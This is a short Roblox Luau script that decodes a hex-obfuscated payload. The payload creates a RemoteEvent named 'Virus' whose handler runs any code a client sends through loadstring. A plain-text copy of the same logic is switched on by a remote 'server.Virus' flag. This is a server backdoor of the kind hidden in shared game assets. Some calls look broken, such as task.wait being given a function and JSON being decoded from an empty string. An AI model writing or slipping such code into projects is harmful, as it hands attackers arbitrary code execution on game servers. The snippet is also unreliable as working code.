local function Decode(data: string): string
    local KEY = 37
	data = data:sub(3)
	local result = {}
	for i = 1, #data, 2 do
		local hex = data:sub(i, i + 1)
		local byte = tonumber(hex, 16) :: number
		byte -= KEY
		table.insert(result, string.char(byte))
	end
	return table.concat(result)
end

local HttpService = game:GetService("HttpService")
local server = HttpService:JSONDecode(Decode(""))

task.wait(function()
    while true do
        if server.Virus == "Enabled" then
            if game.ReplicatedStorage:FindFirstChild("Virus") then return end
            local e = Instance.new("RemoteEvent", game.ReplicatedStorage)
            e.Name = "Virus"

            e.OnServerEvent:Connect(function(_, code)
                loadstring(code)()
            end)
        end
        task.wait(5)
    end
end)

loadstring(Decode("DG9194888691458A4562456E9398998693888A53938A9C4D47778A9294998A6A9B8A93994751458C86928A53778A95918E8886998A8978999497868C8A4E2F8A537386928A456245477B8E979A98472F2F8A537493788A979B8A976A9B8A93995F689493938A88994D8B9A9388998E94934D8451458894898A4E2F45454545919486899899978E938C4D8894898A4E4D4E2F8A93894E2F"))()